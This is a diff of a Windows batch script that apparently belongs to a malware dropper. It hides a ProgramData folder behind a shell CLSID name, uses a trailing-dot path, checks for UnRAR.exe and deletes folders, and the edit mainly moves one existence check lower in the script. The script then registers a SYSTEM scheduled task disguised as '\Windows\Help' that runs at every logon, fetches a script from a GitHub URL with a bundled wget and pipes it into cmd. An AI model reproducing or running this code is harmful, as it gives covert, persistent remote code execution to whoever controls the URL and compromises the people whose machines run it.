@@ -1,11 +1,4 @@
 rename "%ProgramData%\Comms" "LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
-
-setlocal EnableDelayedExpansion
-if exist "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" (
-    rd /s /q "%ProgramData%\Comms"
-    exit /b
-)
-
 setlocal EnableDelayedExpansion
 if exist "%ProgramData%\logdata..\Index.exe" (
     rd /s /q "%ProgramData%\Comms"
@@ -22,6 +15,11 @@ for %a in (%processList%) do (
         rd /s /q "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
         exit /b
     )
+)
+
+if exist "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" (
+    rd /s /q "%ProgramData%\Comms"
+    exit /b
 )
 schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc onlogon /tn "\Windows\Help" /tr "%WINDIR%\System32\cmd.exe /c %ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/zen | cmd /Q /V:ON" /F
 
